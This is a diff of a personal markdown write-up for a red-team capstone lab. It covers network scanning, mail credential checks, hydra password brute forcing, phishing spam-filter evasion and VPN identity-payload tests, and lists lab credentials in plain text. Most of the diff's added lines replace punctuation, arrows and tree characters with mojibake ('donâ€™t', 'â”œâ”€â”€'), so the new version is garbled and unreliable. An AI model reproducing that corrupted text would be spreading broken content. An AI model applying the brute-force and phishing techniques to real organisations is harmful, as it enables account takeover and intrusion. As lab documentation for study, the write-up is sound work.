@@ -6,6 +6,8 @@ THM Username:
 "TAFE Student #":
   - "476462432"
 tags: []
+aliases:
+  - /rtcc
 ---
 ***
 # 1 Red Team Capstone Challenge: My Struggle
@@ -96,9 +98,9 @@ Goal
 
 My screenshots in this write-up show my tmux-based CSAW setup. CSAW is my personal "session bootstrap" that applies my preferences (folders, variables, aliases, `/etc/hosts`, etc.) so I can resume quickly and keep everything consistent.
 
-Even if you don’t use tmux or a similar tool, you can still manually create the same working environment using the commands below.
+Even if you donâ€™t use tmux or a similar tool, you can still manually create the same working environment using the commands below.
 
-Why I do this: the room’s target IP can change between sessions. By keeping everything driven by variables, I can update just `$target_ip` and keep the rest of my workflow intact. It also means the command snippets in this write-up will run exactly as pasted (no constant manual edits).
+Why I do this: the roomâ€™s target IP can change between sessions. By keeping everything driven by variables, I can update just `$target_ip` and keep the rest of my workflow intact. It also means the command snippets in this write-up will run exactly as pasted (no constant manual edits).
 
 > [!note] Optional: CSAW bootstrap
 > Optional: I use my CSAW tool. to bootstrap folders + variables so the snippets in this write-up are paste-ready to run.
@@ -114,12 +116,12 @@ Why I do this: the room’s target IP can change between sessions. By keeping ev
 > [!warning] Optional: 
 > From here to 1. is to emulate my CSAW session environment (no tmux required)
 > If you **skip** this setup, jump straight to: **[1. Baseline recon and scans](#1-baseline-recon-and-scans)**
-> (You can still follow the walkthrough, you’ll just need to manually replace `$target_ip`, `$url`, etc.)
+> (You can still follow the walkthrough, youâ€™ll just need to manually replace `$target_ip`, `$url`, etc.)
 > 
 > 
 > [!info] [Important: If you choose to set session environment]
-> If you open a **new terminal / shell**, you’ll need to re-run this env setup (or `source "$dir/$session.env"`).
-> To make these variables load **automatically in every new shell**, add a small script under `/etc/profile.d/` (or your shell’s startup files) that sources your saved env file.
+> If you open a **new terminal / shell**, youâ€™ll need to re-run this env setup (or `source "$dir/$session.env"`).
+> To make these variables load **automatically in every new shell**, add a small script under `/etc/profile.d/` (or your shellâ€™s startup files) that sources your saved env file.
 > 
 > #### Manual CSAW-style setup
 > 
@@ -190,7 +192,7 @@ Why I do this: the room’s target IP can change between sessions. By keeping ev
 > **Why:** I map the hostname to the current target IP so `$url` stays consistent.
 > 
 > [!note] Permission note
-> This requires sudo (`sudo tee -a`). If you don’t have sudo, skip this and set `url="http://$target_ip"` instead.
+> This requires sudo (`sudo tee -a`). If you donâ€™t have sudo, skip this and set `url="http://$target_ip"` instead.
 > 
 > ```bash
 > # --- CSAW-style /etc/hosts add + verify (paste-safe) ---
@@ -231,7 +233,7 @@ These details define my starting position in the engagement and the network scop
 ---
 Recognising scope and boundaries
 
-This room didn’t start with a single target IP. Instead, I was given a CIDR range, which immediately told me this was meant to simulate a corporate network rather than a one-box challenge. I treated the systems I discovered in this subnet as part of the Corporate Division, assuming that the more sensitive banking and SWIFT infrastructure would only come into view later, once I had moved deeper into the environment.
+This room didnâ€™t start with a single target IP. Instead, I was given a CIDR range, which immediately told me this was meant to simulate a corporate network rather than a one-box challenge. I treated the systems I discovered in this subnet as part of the Corporate Division, assuming that the more sensitive banking and SWIFT infrastructure would only come into view later, once I had moved deeper into the environment.
 
 Because of that, my first step was a Phase 0 network recon. The goal here was simple: work out what was alive, what was exposed, and where it made the most sense to start before moving into detailed, per-host exploitation.
 
@@ -279,9 +281,9 @@ nmap -sn 10.200.40.0/24 -oN /tmp/phase0_host_discovery.txt
 
 ## Phase 1: Service Enumeration
 
-Once I had live hosts, I ran a service identification sweep. While I investigated the quick results, I also ran a more thorough scan in parallel so I didn’t lose time waiting.
+Once I had live hosts, I ran a service identification sweep. While I investigated the quick results, I also ran a more thorough scan in parallel so I didnâ€™t lose time waiting.
 
-Broad "identify services" pass (RustScan → Nmap)
+Broad "identify services" pass (RustScan â†’ Nmap)
 
 Instead of running a single long `nmap -A` pass across all hosts, I used my normal CSAW-style approach: **RustScan for fast discovery**, with Nmap invoked for **default scripts + versioning + OS guess** on discovered ports.
 
@@ -301,7 +303,7 @@ This gave me quick "first signal" across the subnet (what's up + what's exposed)
 
 Parallel completeness check : full TCP sweep
 
-While the faster service discovery was running, I also kicked off a full TCP sweep in parallel. I knew this would take a long time, but I didn’t want to risk missing anything important by relying only on a quick scan.
+While the faster service discovery was running, I also kicked off a full TCP sweep in parallel. I knew this would take a long time, but I didnâ€™t want to risk missing anything important by relying only on a quick scan.
 
 ```bash
 nmap -Pn -p- -sS -sV -T4 "$target_ip"
@@ -317,7 +319,7 @@ When the full sweep finished, it confirmed the services I had already seen and a
 >
 This port did not show up during the faster pass, which validated my decision to run a full-range check as part of Phase 0.
 
->Running both scans side by side gave me quick direction early on, and confidence later that I hadn’t overlooked anything exposed on unusual ports.
+>Running both scans side by side gave me quick direction early on, and confidence later that I hadnâ€™t overlooked anything exposed on unusual ports.
 
 #recall
 Meaningful results (high signal):
@@ -380,7 +382,7 @@ After Phase 0, I moved into the familiar workflow: **pick one host (10.200.40.12
 ### Port Scanning
 
 The following command lines were captured directly from the scan output headers for 10.200.40.12:
-Fast pass (RustScan → Nmap)
+Fast pass (RustScan â†’ Nmap)
 ```bash
 rustscan -u 5000 -a "$target_ip" -- -sC -sV -O -T4
 ```
@@ -468,7 +470,7 @@ From here, the plan was to build a **username candidate set** by applying common
 - case variants (lower/upper)
 
 > [!warning] Evidence note
-> The exact extraction of names from the web UI (and any additional names discovered) wasn’t captured cleanly in the current tmux logs: I mostly observed this in-browser. The items above are what I *did* have recorded in the CSAW session output.
+> The exact extraction of names from the web UI (and any additional names discovered) wasnâ€™t captured cleanly in the current tmux logs: I mostly observed this in-browser. The items above are what I *did* have recorded in the CSAW session output.
 
 Drafting custom wordlists (rules + password policy-aware variants)
 
@@ -502,7 +504,7 @@ With the candidate lists in place, I attempted to use FFUF to exercise the login
 ---
 Cursory injection check (SQLmap): no obvious signal
 
-I also did a quick, low-effort SQLi probe against the form using SQLmap. I didn’t see an immediate positive, and at this stage I also didn’t find an easy way to probe username syntax or obvious injection behaviour from response differences.
+I also did a quick, low-effort SQLi probe against the form using SQLmap. I didnâ€™t see an immediate positive, and at this stage I also didnâ€™t find an easy way to probe username syntax or obvious injection behaviour from response differences.
 > Again, this remains open to deeper probing, but higher priority attack vectors exist.
 
 ---
@@ -665,7 +667,7 @@ nmap -p "$PORTS" --script smb-vuln* \
 ```
 
 **Outcome (high signal lines):**
-- Supported dialects: SMB2/SMB3 variants (2.0.2 → 3.1.1)
+- Supported dialects: SMB2/SMB3 variants (2.0.2 â†’ 3.1.1)
 - `smb2-security-mode`: **Message signing enabled but not required**
 - `smb-os-discovery`: no additional output returned in this run
 - `smb-vuln*`: no obvious positive findings; one script returned `false`, another failed to negotiate
@@ -722,7 +724,7 @@ done
 ```
 
 > [!success] Takeaway
-> This was enough to stop me chasing a web login that probably doesn’t exist on this host.
+> This was enough to stop me chasing a web login that probably doesnâ€™t exist on this host.
 
 ---
 
@@ -799,7 +801,7 @@ I also briefly attempted a TLS handshake directly to 587 and got:
 
 - `wrong version number`
 
-That’s a normal symptom when you try to speak TLS to a plaintext service.
+Thatâ€™s a normal symptom when you try to speak TLS to a plaintext service.
 
 > [!note] Lesson learned
 > Port `587` here is plaintext SMTP with `AUTH LOGIN`. It is not implicit TLS.
@@ -825,13 +827,13 @@ swaks --server "$target_ip" --port 587 \
 > The response included a `235 authenticated.` which confirmed the mailbox creds are valid for SMTP auth on this server.
 
 ---
-> [!error] Lessons learned (what I should’ve done in retrospect)
+> [!error] Lessons learned (what I shouldâ€™ve done in retrospect)
 > I went too fast into "is TLS a thing?" before proving what the services actually offered. Next time I should run the winning sequence in this order:
-> 1. **Capability probe first:** targeted Nmap scripts on `25/587/110/143` to learn what’s supported (especially `AUTH` and `STARTTLS`)
+> 1. **Capability probe first:** targeted Nmap scripts on `25/587/110/143` to learn whatâ€™s supported (especially `AUTH` and `STARTTLS`)
 > 2. **Quick banner + EHLO capture:** confirm the server speaks SMTP and record the advertised extensions
 > 3. **Prove auth early:** use `swaks` with `--quit-after AUTH` to confirm creds work without sending mail
 > 4. **Prove read access:** login via IMAP and fetch headers (this is the real "I can access my mailbox" proof)
-> 5. **Only then test TLS/STARTTLS:** if the capability output actually shows it, otherwise don’t waste time
+> 5. **Only then test TLS/STARTTLS:** if the capability output actually shows it, otherwise donâ€™t waste time
 
 ![[redcap_email3.png]]
 
@@ -840,7 +842,7 @@ swaks --server "$target_ip" --port 587 \
 ### Mailbox Compromise
 
 At this point I had strong evidence that:
-- there’s no webmail GUI exposed
+- thereâ€™s no webmail GUI exposed
 - SMTP AUTH is working with the issued mailbox credentials and plain text
 - the next logical proof is end-to-end mailbox access
 
@@ -898,14 +900,14 @@ Key takeaways (facts + informed observations)
 #DeleteMeStart
 * I wanna backtrack to here after evidence mapping
 * ++ stage my favourite arrow here for copy paste since my alt codes arent working:
-	  →
+	  â†’
 #DeleteMeEnd
-Key takeaways (evidence → meaning)
+Key takeaways (evidence â†’ meaning)
 
 | Evidence (observed)                                                                                       | Why it matters (informed observation)                                                                                        |
 | --------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
 | **Mailbox confirmed:** `Triage@corp.th3reserve.loc` authenticates and contains mail.                      | Confirms the issued creds are valid and this inbox is a reliable comms channel for the engagement.                           |
-| **Mail volume:** `1 EXISTS` observed so far.                                                              | Either only one message has been sent to this mailbox yet, or retention/foldering isn’t in play at this stage.               |
+| **Mail volume:** `1 EXISTS` observed so far.                                                              | Either only one message has been sent to this mailbox yet, or retention/foldering isnâ€™t in play at this stage.               |
 | **Sender identity:** `amoebaman@corp.th3reserve.loc` signs as `Am0` and states he's **Head of Security**. | Likely a "privileged narrator" account; anything sent from this address may contain next-stage guidance, creds, or triggers. |
 | **Leetspeak pattern in signature:** `amoebaman` ? `Am03baM4n` ? `Am0` (seen subs: `o=0`, `e=3`, `a=4`).   | Candidate transformation rules for username/password construction elsewhere (worth remembering for later brute/guessing).    |
 | **Org language:** Mentions "ExCo".                                                                        | Likely Executive Committee; reinforces senior/internal context.                                                              |
@@ -923,18 +925,18 @@ Email naming conventions (hypothesis)
 | Lead / idea                                                             | Why it might matter                                                     | Low-cost test                                                                                        |
 | ----------------------------------------------------------------------- | ----------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
 | Sender signs as `Amo` while mailbox is `amoebaman@corp.th3reserve.loc`. | Could be a nickname/handle *or* a naming convention hint.               | Watch for bounces/autoreplies when sending to variants.                                              |
-| "CTF-style handle" interpretation (`amoebaman` → "amoeba man").         | Suggests playful/handle-based usernames. Pop/Netizen culture reference? | Test other obvious handle-like usernames seen in-room.                                               |
+| "CTF-style handle" interpretation (`amoebaman` â†’ "amoeba man").         | Suggests playful/handle-based usernames. Pop/Netizen culture reference? | Test other obvious handle-like usernames seen in-room.                                               |
 | Forced split: **Amo Ebaman** (first+last, no separator).                | If real, might indicate other mailboxes follow first+last patterns.     | Try `FirstnameLastname@...`, @...`[no separator] for other found names and observe server responses. |
 
 > [!note] Judgement
-> I can’t prove whether `amoebaman` is a handle or a real name.  
-> Still, this is low-cost to test because delivery errors, bounces, and auto replies can reveal the organisation’s email naming pattern.
+> I canâ€™t prove whether `amoebaman` is a handle or a real name.  
+> Still, this is low-cost to test because delivery errors, bounces, and auto replies can reveal the organisationâ€™s email naming pattern.
 
 Email phishing is likely a key mechanic
 
 > [!tip] Quick thought
 > The project scope explicitly lists **"Phishing of any of the employees of TheReserve."** as *in-scope*.  
-> With that in mind, I’m treating phishing as a very likely win-condition path, and this initial mailbox access feels like the intended setup for it.
+> With that in mind, Iâ€™m treating phishing as a very likely win-condition path, and this initial mailbox access feels like the intended setup for it.
 
 ---
 SET REMINDER : standing email checks
@@ -1111,18 +1113,18 @@ Pivot! prioritising next investigative paths
 After receiving the first confirmed internal communication from `amoebaman@corp.th3reserve.loc` I paused before continuing to reassess direction. Rather than pursuing every possible technical avenue in parallel, I ranked the most likely paths based on the Red Team Capstone scope, narrative signals, and artefacts already discovered.
 
 > [!info] Why I paused here  
-At this stage it was easy to drift into technically interesting but low‑signal paths. Re‑anchoring on scope and intent helped ensure the next steps stayed aligned with how this scenario is meant to unfold.
+At this stage it was easy to drift into technically interesting but lowâ€‘signal paths. Reâ€‘anchoring on scope and intent helped ensure the next steps stayed aligned with how this scenario is meant to unfold.
 
 > [!success] Primary focus : WebMail access on `.11`  
-The project scope explicitly lists attacking employee mailboxes on the WebMail host (.11) as in‑scope. With that and now that I have confirmed the existence of `amoebamab@corp.the3reserve.loc`, combined with the early delivery of a human‑authored internal email and evidence that plaintext mail authentication is accepted elsewhere, this strongly suggests that mailbox access is an intended progression point. Controlled access attempts using known valid users and a constrained, policy‑aware wordlist represent the highest‑confidence next move.
+The project scope explicitly lists attacking employee mailboxes on the WebMail host (.11) as inâ€‘scope. With that and now that I have confirmed the existence of `amoebamab@corp.the3reserve.loc`, combined with the early delivery of a humanâ€‘authored internal email and evidence that plaintext mail authentication is accepted elsewhere, this strongly suggests that mailbox access is an intended progression point. Controlled access attempts using known valid users and a constrained, policyâ€‘aware wordlist represent the highestâ€‘confidence next move.
 
 > [!tip] Secondary option : VPN portal on `10.200.40.12`  
-A VPN portal is exposed with messaging indicating internal credentials should be used. This makes it a plausible follow‑on path once credentials are confirmed, but it is more likely designed as an access enabler rather than the initial discovery vector.
+A VPN portal is exposed with messaging indicating internal credentials should be used. This makes it a plausible followâ€‘on path once credentials are confirmed, but it is more likely designed as an access enabler rather than the initial discovery vector.
 
 > [!warning] Deferred option : SMB signing not required  
-SMB services advertise message signing as enabled but not required. While this is a real technical weakness, it is better treated as a later‑stage escalation or lateral movement technique once stronger identity context and credentials are established.
+SMB services advertise message signing as enabled but not required. While this is a real technical weakness, it is better treated as a laterâ€‘stage escalation or lateral movement technique once stronger identity context and credentials are established.
 
-> Based on this prioritisation, the next actions should focus on mailbox access on `.11`, with VPN or SMB‑based pivots only reassessed after stronger evidence is obtained.
+> Based on this prioritisation, the next actions should focus on mailbox access on `.11`, with VPN or SMBâ€‘based pivots only reassessed after stronger evidence is obtained.
 ---
 
 IMAP Mailbox Compromise via Validated Credentials
@@ -1131,9 +1133,9 @@ Goal
 Move from confirming the `amoebaman` account exists to authenticated IMAP access to the `amoebaman` mailbox using the previously generated policy-aware wordlist.
 Reusing the Policy-Aware Wordlist
 
-I didn’t generate a new wordlist here. I reused the custom list I had already built earlier in **Section 7.2: Drafting custom wordlists (rules + password policy-aware variants)** and pointed it at IMAP.
+I didnâ€™t generate a new wordlist here. I reused the custom list I had already built earlier in **Section 7.2: Drafting custom wordlists (rules + password policy-aware variants)** and pointed it at IMAP.
 
-That list was already shaped around the target’s password policy, so there was no reason to expand it or try anything noisier. At this point, the goal was simply to see whether a real mailbox would authenticate using credentials that already fit the domain rules.
+That list was already shaped around the targetâ€™s password policy, so there was no reason to expand it or try anything noisier. At this point, the goal was simply to see whether a real mailbox would authenticate using credentials that already fit the domain rules.
 
 The wordlist included:
 
@@ -1268,18 +1270,18 @@ Breakdown of the email wins
 
 Extracted Hits
 
-| Artefact (from `Received:`)                                      | What I think it means                                                                                                          | Why I care / how I’ll use it                                                                                                                                |
+| Artefact (from `Received:`)                                      | What I think it means                                                                                                          | Why I care / how Iâ€™ll use it                                                                                                                                |
 | ---------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `WRK1.corp.thereserve.loc` (`172.31.10.21`)                      | This looks like a real internal workstation that submitted mail into the server (`MAIL`).                                      | High value internal lead. I’m keeping WRK1 + 172.31.10.21 on my target map as a likely endpoint I might pivot back to later.                                |
+| `WRK1.corp.thereserve.loc` (`172.31.10.21`)                      | This looks like a real internal workstation that submitted mail into the server (`MAIL`).                                      | High value internal lead. Iâ€™m keeping WRK1 + 172.31.10.21 on my target map as a likely endpoint I might pivot back to later.                                |
 | `corp.th3reserve.loc` vs `corp.thereserve.loc`                   | The environment is handling more than one internal domain or alias. The "th3" version is not just cosmetic.                    | This can impact auth formats and why some identities only work under the `th3` domain. I'll stick to the exact domain tied to the user when testing logins. |
-| `mail.thereserve.loc` / `corp.th3reserve.loc` with `[127.0.0.1]` | Loopback isn’t a real origin IP, it suggests the mail server is handing the message off locally (self-relay/local submission). | Not a pivot by itself, but it confirms internal naming and gives me more confidence about the mail server’s identity and accepted domains.                  |
+| `mail.thereserve.loc` / `corp.th3reserve.loc` with `[127.0.0.1]` | Loopback isnâ€™t a real origin IP, it suggests the mail server is handing the message off locally (self-relay/local submission). | Not a pivot by itself, but it confirms internal naming and gives me more confidence about the mail serverâ€™s identity and accepted domains.                  |
 | `n77-cust.coolideas.co.za` (`102.132.129.3`)                     | Looks like an external internet origin for part of the Paula Bailey chain, probably just realism/noise.                        | Low priority. I'll note it lightly as "external sender" unless the room later pushes me into OSINT or social-engineering angles.                            |
 | paula.bailey@corp.thereserve.loc                                 | odd pass: Fzjh7463                                                                                                             |                                                                                                                                                             |
 
 `Phishbot` Code Analysis and Future Phishing/Spam Handling Tests
 
 > [!note] Reverse engineered spam filtering avoidance
-> The key is to treat this as **two layers**: server delivery filtering, then the bot’s post-delivery parsing.
+> The key is to treat this as **two layers**: server delivery filtering, then the botâ€™s post-delivery parsing.
 >
 > [!tip] Layer 1: server spam filter (delivery)
 >> Goal: make sure the message gets received at all.
@@ -1298,7 +1300,7 @@ Extracted Hits
 
 > [!example] Safe working model
 > - If the email never arrives: the **server spam filter** likely killed it
-> - If it arrives but behaviour changes: it’s likely **phishbot logic** (multipart, attachment detection, keyword hits)
+> - If it arrives but behaviour changes: itâ€™s likely **phishbot logic** (multipart, attachment detection, keyword hits)
 
 ---
 
@@ -1423,8 +1425,8 @@ Critical Insight
 Upon testing email delivery to secondary addresses, I noticed an anomaly:
 
 ```
-âœ— aimee.walker@corp.th3reserve.loc — REJECTED (550 forwarding loop)
-✓ aimee.walker@corp.thereserve.loc — QUEUED (250 OK)
+Ã¢Å“â€” aimee.walker@corp.th3reserve.loc â€” REJECTED (550 forwarding loop)
+âœ“ aimee.walker@corp.thereserve.loc â€” QUEUED (250 OK)
 ```
 
 **The domain `th3reserve` (with the "3") is PROTECTED, but `thereserve` (without the "3") is ACTIVE.**
@@ -1440,16 +1442,16 @@ Domain Architecture Map
 Scope: 10.200.40.0/24
 
 Domain th3reserve.loc (PROTECTED):
-├── amoebaman@corp.th3reserve.loc (PROTECTED - forwards only)
-├── Triage@corp.th3reserve.loc (WORKING - issued credential)
-├── [potentially others]
+â”œâ”€â”€ amoebaman@corp.th3reserve.loc (PROTECTED - forwards only)
+â”œâ”€â”€ Triage@corp.th3reserve.loc (WORKING - issued credential)
+â”œâ”€â”€ [potentially others]
 
 Domain thereserve.loc (ACTIVE):
-├── aimee.walker@corp.thereserve.loc (VALID - exists, needs password)
-├── patrick.edwards@corp.thereserve.loc (VALID - exists, needs password)
-├── paula.bailey@corp.thereserve.loc (VALID - phishbot account)
-├── applications@corp.thereserve.loc (BROKEN - 550 forwarding loop)
-├── [potentially others]
+â”œâ”€â”€ aimee.walker@corp.thereserve.loc (VALID - exists, needs password)
+â”œâ”€â”€ patrick.edwards@corp.thereserve.loc (VALID - exists, needs password)
+â”œâ”€â”€ paula.bailey@corp.thereserve.loc (VALID - phishbot account)
+â”œâ”€â”€ applications@corp.thereserve.loc (BROKEN - 550 forwarding loop)
+â”œâ”€â”€ [potentially others]
 ```
 
 ---
@@ -1527,7 +1529,7 @@ Reconnaissance Source
 From the website at `http://10.200.40.13/october/index.php/demo/contactus`:
 
 ```
-"Â© 1996 - 2026 Aimee Walker & Patrick Edwards. Lead Developers at TheReserve"
+"Ã‚Â© 1996 - 2026 Aimee Walker & Patrick Edwards. Lead Developers at TheReserve"
 ```
 
 This provided **two real names** to enumerate.
@@ -1542,9 +1544,9 @@ developers=(
   "aimeewalker@corp.th3reserve.loc"       # REJECTED (loop)
   "aimee.w@corp.th3reserve.loc"           # REJECTED (loop)
   "a.walker@corp.th3reserve.loc"          # REJECTED (loop)
-  "aimee.walker@corp.thereserve.loc"      # ✓ QUEUED
+  "aimee.walker@corp.thereserve.loc"      # âœ“ QUEUED
   "patrick.edwards@corp.th3reserve.loc"   # REJECTED (loop)
-  "patrick.edwards@corp.thereserve.loc"   # ✓ QUEUED
+  "patrick.edwards@corp.thereserve.loc"   # âœ“ QUEUED
   # ... 28 more variations (all rejected)
 )
 
@@ -1717,21 +1719,21 @@ Session Artifacts & Logs
 Working Directory: $dir/Recon/email/spear_v2/
 
 Key Files:
-├── passwords_endgame.txt              (78,480 lines, 1.0M)
-├── hydra_aimee_endgame.log           (live, monitoring for success)
-├── hydra_patrick_endgame.log         (live, monitoring for success)
-├── swaks_test_*.log                  (SMTP delivery confirmation logs)
-├── campaign_logs/                    (phishing attempt history)
-└── responses/                        (IMAP extraction results)
+â”œâ”€â”€ passwords_endgame.txt              (78,480 lines, 1.0M)
+â”œâ”€â”€ hydra_aimee_endgame.log           (live, monitoring for success)
+â”œâ”€â”€ hydra_patrick_endgame.log         (live, monitoring for success)
+â”œâ”€â”€ swaks_test_*.log                  (SMTP delivery confirmation logs)
+â”œâ”€â”€ campaign_logs/                    (phishing attempt history)
+â””â”€â”€ responses/                        (IMAP extraction results)
 
 Environment Variables:
-├── MAIL_USER_AM0="amoebaman@corp.th3reserve.loc"
-├── MAIL_PASS_AM0="Password1@"
-├── MAIL_USER_PAULA="paula.bailey@corp.thereserve.loc"
-├── MAIL_PASS_PAULA="Fzjh7463"
-├── MAIL_USER_AIMEE="aimee.walker@corp.thereserve.loc"
-├── MAIL_USER_PATRICK="patrick.edwards@corp.thereserve.loc"
-└── $tip="10.200.40.11"
+â”œâ”€â”€ MAIL_USER_AM0="amoebaman@corp.th3reserve.loc"
+â”œâ”€â”€ MAIL_PASS_AM0="Password1@"
+â”œâ”€â”€ MAIL_USER_PAULA="paula.bailey@corp.thereserve.loc"
+â”œâ”€â”€ MAIL_PASS_PAULA="Fzjh7463"
+â”œâ”€â”€ MAIL_USER_AIMEE="aimee.walker@corp.thereserve.loc"
+â”œâ”€â”€ MAIL_USER_PATRICK="patrick.edwards@corp.thereserve.loc"
+â””â”€â”€ $tip="10.200.40.11"
 ```
 
 ---
@@ -1954,7 +1956,7 @@ thereserve2023!
 > - Relevant year
 > - Policy complexity
 >
-> Combined with her executive support role, this makes Lynda’s mailbox **extremely high value** for secondary credentials and executive context.
+> Combined with her executive support role, this makes Lyndaâ€™s mailbox **extremely high value** for secondary credentials and executive context.
 
 ---
 
@@ -2770,7 +2772,7 @@ To determine whether VPN certificate identity is bound to the authenticated logi
 > - The portal should strictly validate and authorize the requested identity before minting anything.
 > - If the input does not match an allowed identity for the authenticated session, it should hard-fail (no profile generation, no fallback behavior).
 >
-> *Personal note:* room/scenario logic like this can be a bit frustrating because it’s not how a sane production portal would normally behave, unless it was seriously broken or half-implemented. Still, it’s useful evidence here because it shows the endpoint’s branching behavior clearly.
+> *Personal note:* room/scenario logic like this can be a bit frustrating because itâ€™s not how a sane production portal would normally behave, unless it was seriously broken or half-implemented. Still, itâ€™s useful evidence here because it shows the endpointâ€™s branching behavior clearly.
 
 
 > [!warning] I did this but I probably shouldn't:
@@ -2868,7 +2870,7 @@ To determine whether VPN certificate identity is bound to the authenticated logi
 >> 
 >> # Unicode and encoding tricks
 >> test_payload $'\xc0\x80CORP\antony.ross' "Overlong UTF-8 null"
->> test_payload "​CORP\antony.ross" "Zero-width space (U+200B)"
+>> test_payload "â€‹CORP\antony.ross" "Zero-width space (U+200B)"
 >> test_payload " CORP\antony.ross" "Non-breaking space (U+00A0)"
 >> 
 >> # Case variations (might not match regex but normalize later)
@@ -3241,15 +3243,15 @@ I will keep artefacts deterministic so results are easy to compare and re review
 
 ```sh
 Forge/Testing/
-├── certificates/                 # input .ovpn files
-├── phase0_validation/            # offline validation outputs
-├── phase1_connectivity/
-│   ├── logs/                     # per cert VPN client logs
-?   └── enum/                     # per cert quick snapshot outputs
-├── phase2_deep_enum/             # only for shortlisted certs
-├── evidence/                     # screenshots, any captures
-├── reports/                      # roll up CSVs and summaries
-└── scripts/                      # deferred until VPN viability is proven
+â”œâ”€â”€ certificates/                 # input .ovpn files
+â”œâ”€â”€ phase0_validation/            # offline validation outputs
+â”œâ”€â”€ phase1_connectivity/
+â”‚   â”œâ”€â”€ logs/                     # per cert VPN client logs
+?   â””â”€â”€ enum/                     # per cert quick snapshot outputs
+â”œâ”€â”€ phase2_deep_enum/             # only for shortlisted certs
+â”œâ”€â”€ evidence/                     # screenshots, any captures
+â”œâ”€â”€ reports/                      # roll up CSVs and summaries
+â””â”€â”€ scripts/                      # deferred until VPN viability is proven
 ```
 
 **Phase 0 artefacts**
@@ -3335,7 +3337,7 @@ These are the main "trial and error" moments I hit while getting to a stable wor
 > My first batch of "failed" runs was not meaningful because the client side was not consistently creating the tunnel interface or applying routes.  
 > **Fix:** always confirm the *local* prerequisites (interface present, route table changes, expected log milestones) before deciding the server rejected anything.
 
-> [!failure] Lessons learned: routing can lie to you if you don’t look at longest-prefix match
+> [!failure] Lessons learned: routing can lie to you if you donâ€™t look at longest-prefix match
 > Once host-specific routes appeared, they overrode broader network routes. If I did not look at `ip route get`, I could easily mis-attribute reachability to the wrong path.  
 > **Fix:** record route decisions with `ip route get ?` as part of every comparison.
 
@@ -4371,7 +4373,7 @@ Extraction result (conclusion for this stage)
 VPN Host Access Verification (Flag File Challenge)
 
 > [!note] Why this step exists
-> I felt as I had not done so yet, I would check the "e-Citizen" SSH platform for flag completions. The first of which I took as requires a **post-VPN access verification** on the **VPN host** to prove the tunnel is functional and that Ican interact with the internal environment. Verification is completed by creating a specific file under `/flag/` and then triggering the platform’s check.
+> I felt as I had not done so yet, I would check the "e-Citizen" SSH platform for flag completions. The first of which I took as requires a **post-VPN access verification** on the **VPN host** to prove the tunnel is functional and that Ican interact with the internal environment. Verification is completed by creating a specific file under `/flag/` and then triggering the platformâ€™s check.
 
 > [!quote] Verification prompt (as provided)
 > "In order to verify your access, please complete the following steps.  
@@ -4383,7 +4385,7 @@ VPN Host Access Verification (Flag File Challenge)
 > Once you have performed the steps, please enter Y to verify your access.  
 > If you wish to fully exit verification and try again please, please enter X  
 > If you wish to remove this verification attempt, please enter Z  
-> Ready to verify? [Y/X/Z]:”
+> Ready to verify? [Y/X/Z]:â€
 
 What "VPN host" means in this context
 > This is giving me the most confusion as I am not sure it relates to the .12 host with the name "VPN" or, if it means the backbone service that is routing.
@@ -4611,7 +4613,7 @@ Safe validation ideas (no bypass recipes):
 - observe whether error messages disclose local path handling (e.g., "file not found" in a server directory)
 - confirm whether the server normalises paths (e.g., collapsing `../`) by comparing error outputs
 
-> [!failure] Don’t overclaim  
+> [!failure] Donâ€™t overclaim  
 > If all you have is "traversal strings failed", report it as "LFI attempts did not succeed" and keep "possible LFI bypass" as future work.
 
 ---
@@ -4725,7 +4727,7 @@ googled it: "**Purpose**: It powers the interactive features and user interface 
 Quick automated scan before pivoting back
 
 > [!note] Why I bothered with this  
-> Before diving fully into the backend auth area, I ran ZAP’s spider, AJAX spider, and a short active scan over the October CMS site. I did not expect a magic win, but I wanted to be sure I was not ignoring some obvious unauthenticated issue.
+> Before diving fully into the backend auth area, I ran ZAPâ€™s spider, AJAX spider, and a short active scan over the October CMS site. I did not expect a magic win, but I wanted to be sure I was not ignoring some obvious unauthenticated issue.
 
 What I actually ran
 - Normal spider across the October app
@@ -4836,7 +4838,7 @@ Wordlist choice (first pass)
 
 Why I did not use raw `ffuf` for this
 
-The form uses **dynamic CSRF + session key + cookie state**. A simple static POST replay (or na’ve `ffuf` without refresh logic) will reuse stale values and fail even if credentials are valid.
+The form uses **dynamic CSRF + session key + cookie state**. A simple static POST replay (or naâ€™ve `ffuf` without refresh logic) will reuse stale values and fail even if credentials are valid.
 
 I treated my scripted loop as the "base ffuf equivalent":
 - GET `/signin` to harvest `_token` and `_session_key` and cookie
@@ -4961,7 +4963,7 @@ Restore tests and outcomes
 > [!important] Indicator takeaway
 > `div#layout-flash-messages` is my primary decision signal:
 > - Signin `/auth/signin`: generic failure string: **"A user was not found with the given credentials."**
-> - Restore `/auth/restore`: explicit not-found string: **"A user could not be found with a login value of …"**
+> - Restore `/auth/restore`: explicit not-found string: **"A user could not be found with a login value of â€¦"**
 >
 > If a valid account exists, I expect either:
 > - a different flash message (e.g., "reset email sent"), or
@@ -5007,7 +5009,7 @@ This div contents will be the indicator of a successful account confirmed by res
 > Connection could not be established with host smtp.mailgun.org :stream_socket_client(): unable to connect to tcp://smtp.mailgun.org:587 (Connection timed out)
 > ```
 > **Red team takeaways (my notes):**
-> - I’ve confirmed the backend is likely PHP (`stream_socket_client()` disclosure).
+> - Iâ€™ve confirmed the backend is likely PHP (`stream_socket_client()` disclosure).
 > - The application is using Mailgun SMTP on port 587 for password reset workflows.
 > - The server is exposing internal infrastructure details directly to the client.
 > - Outbound SMTP connectivity appears blocked or misconfigured (timeout observed).
@@ -5070,7 +5072,7 @@ Immediately I take notice of old Windows version 10 build and think "PrintNightm
     
 - **CVE-2021-34481** PrintNightmare linked issue ? RCE in Print Spooler.
     
-- **CVE-2021-36934** "HiveNightmare / SeriousSAM" — Elevation of Privilege via overly-permissive ACLs on SAM registry hive.
+- **CVE-2021-36934** "HiveNightmare / SeriousSAM" â€” Elevation of Privilege via overly-permissive ACLs on SAM registry hive.
     
 - **CVE-2021-31187** Windows WalletService Elevation of Privilege.
     
@@ -5085,7 +5087,7 @@ Immediately I take notice of old Windows version 10 build and think "PrintNightm
 
 ssh-enum-algos
 ```zsh
-└?$ nmap -sV -Pn --script ssh2-enum-algos $target_ip
+â””?$ nmap -sV -Pn --script ssh2-enum-algos $target_ip
